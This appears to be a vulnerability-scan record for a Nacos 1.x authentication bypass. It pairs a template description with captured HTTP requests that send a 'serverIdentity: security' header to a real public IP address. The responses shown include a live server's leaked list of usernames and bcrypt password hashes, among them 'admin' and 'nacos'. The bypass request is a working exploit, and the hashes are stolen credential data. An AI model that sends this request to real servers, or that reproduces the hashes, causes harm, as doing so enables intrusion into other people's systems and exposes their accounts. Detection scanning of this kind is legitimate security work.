info.name: Nacos 1.x - Authentication Bypass
info.author: taielab,pikpikcu,SleepingBag945
info.description: Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.

req_resp.req:
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
HOST: 47.122.7.81
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
serverIdentity: security
req_resp.resp:
HTTP/1.1 200
Content-Security-Policy: script-src 'self'
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Fri, 21 Mar 2025 14:30:01 GMT
Keep-Alive: timeout=60
Connection: keep-alive

{"totalCount":12,"pageNumber":1,"pagesAvailable":2,"pageItems":[{"username":"nacos","password":"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"},{"username":"Q20OY8","password":"$2a$10$DHUZuDIAWbCiWpgU.VT3aO1tzRx8UgKYpwbex8RADX2gj2hPoREIW"},{"username":"abc123","password":"$2a$10$zy9f/wInIVSYonWeuAFr4OPpxW6odcHdc3.ZKws7ySQau.Dnz5nva"},{"username":"test2","password":"$2a$10$u4k/73w8RZyfcUIAbG5I1u9el5ic/uGmP6oAcqH1vjVQ2957fAfgK"},{"username":"myworld1634","password":"$2a$10$g1hFO1P.72tPnw8NT5kE0.rl8TEMhYdiPF6tmcqGQqhCyv0qRWQrS"},{"username":"haidan","password":"$2a$10$t2CWXZCVbi7.1u7kif5Ece/zQoHjYtiJgdCDWbRUO.MuQT3Rjf8Au"},{"username":"NacosAD","password":"$2a$10$QZChp.Mus/LIYuUzscBdduZ4E3xlhvZ4yIo2RQ.2Hylal7s/lJQze"},{"username":"sktt","password":"$2a$10$bXbQwLCwB7FmOLX9VfHo4uMWRRzqSzyeOrAO.dzR0YItzHUF8gBLi"},{"username":"admin","password":"$2a$10$1qwPPRQmFeD8omg/2M6bqOFzPDxyqBsMUPJnuuJ3gNR5qtdVHv79K"}]}

req_resp.req:
GET /v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
HOST: 47.122.7.81
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
serverIdentity: security

HTTP/1.1 404 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 431 Date: Fri, 21 Mar 2025 14:30:01 GMT Keep-Alive: timeout=60 Connection: keep-alive HTTP Status 404 – Not Found
